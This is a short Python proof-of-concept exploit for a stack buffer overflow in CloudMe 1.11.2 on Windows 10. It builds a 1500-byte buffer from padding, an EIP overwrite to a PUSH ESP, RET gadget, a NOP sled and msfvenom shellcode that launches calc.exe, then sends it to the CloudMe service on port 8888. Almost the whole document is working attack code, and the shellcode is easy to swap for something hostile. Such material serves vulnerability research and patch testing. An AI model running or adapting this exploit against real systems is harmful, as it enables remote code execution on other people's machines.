# Exploit Title: CloudMe 1.11.2 - Buffer Overflow (PoC)
# Date: 2020-04-27
# Exploit Author: Andy Bowden
# Vendor Homepage: https://www.cloudme.com/en
# Software Link: https://www.cloudme.com/downloads/CloudMe_1112.exe
# Version: CloudMe 1.11.2
# Tested on: Windows 10 x86

#Instructions:
# Start the CloudMe service and run the script.

import socket

target = "127.0.0.1"

padding1   = b"\x90" * 1052
EIP        = b"\xB5\x42\xA8\x68" # 0x68A842B5 -> PUSH ESP, RET
NOPS       = b"\x90" * 30

#msfvenom -a x86 -p windows/exec CMD=calc.exe -b '\x00\x0A\x0D' -f python
payload =  b""
payload += b"\xda\xc2\xd9\x74\x24\xf4\x5b\xb8\x45\xe8\xaa\xc4"
payload += b"\x31\xc9\xb1\x3e\x83\xeb\xfc\x31\x43\x15\x03\x43"
payload += b"\x15\xa7\x1d\x56\x2c\xa5\xde\xa7\xad\xc9\x57\x42"
payload += b"\x9c\xc9\x0c\x06\x8f\xf9\x47\x4a\x3c\x72\x05\x7f"
payload += b"\xb7\xf6\x82\x70\x70\xbc\xf4\xbf\x81\xec\xc5\xde"
payload += b"\x01\xee\x19\x01\x3b\x21\x6c\x40\x7c\x5f\x9d\x10"
payload += b"\xd5\x14\x30\x85\x52\x60\x89\x2e\x28\x65\x89\xd3"
payload += b"\xf9\x84\xb8\x45\x71\xdf\x1a\x67\x56\x54\x13\x7f"
payload += b"\xbb\x50\xed\xf4\x0f\x2f\xec\xdc\x41\xd0\x43\x21"
payload += b"\x6e\x23\x9d\x65\x49\xdb\xe8\x9f\xa9\x66\xeb\x5b"
payload += b"\xd3\xbc\x7e\x78\x73\x37\xd8\xa4\x85\x94\xbf\x2f"
payload += b"\x89\x51\xcb\x68\x8e\x64\x18\x03\xaa\xed\x9f\xc4"
payload += b"\x3a\xb5\xbb\xc0\x67\x6e\xa5\x51\xc2\xc1\xda\x82"
payload += b"\xad\xbe\x7e\xc8\x40\xab\xf2\x93\x0e\x2a\x80\xa9"
payload += b"\x7d\x2c\x9a\xb1\xd1\x44\xab\x3a\xbe\x13\x34\xe9"
payload += b"\xfa\xeb\x7e\xb0\xab\x63\x27\x20\xee\xee\xd8\x9e"
payload += b"\x2d\x16\x5b\x2b\xce\xed\x43\x5e\xcb\xaa\xc3\xb2"
payload += b"\xa1\xa3\xa1\xb4\x16\xc4\xe3\xf6\xa2\x66\x74\x98"
payload += b"\xbf\xe6\xf4\x06\x28\x72\x91\xd9\xcb\x09\x05\x41"
payload += b"\x75\x80\xe9\xf8\xf5\x36\x7d\x62\x92\x9a\xef\x07"
payload += b"\x74\x47\x88\xa2\xa8\xb6\x58\x03\x98\x88\xb6\x6a"
payload += b"\xee\xc6\xf4\xba\x2e\x23\xcc\xf7\x1b\x6b\x03\x9d"
payload += b"\x43\x08\x36\x39\xaa\xab\xb0\xa4\xb2"


overrun    = b"C" * (1500 - len(padding1 + NOPS + EIP + payload))	

buf = padding1 + EIP + NOPS + payload + overrun 

try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target,8888))
	s.send(buf)
except Exception as e:
	print(sys.exc_value)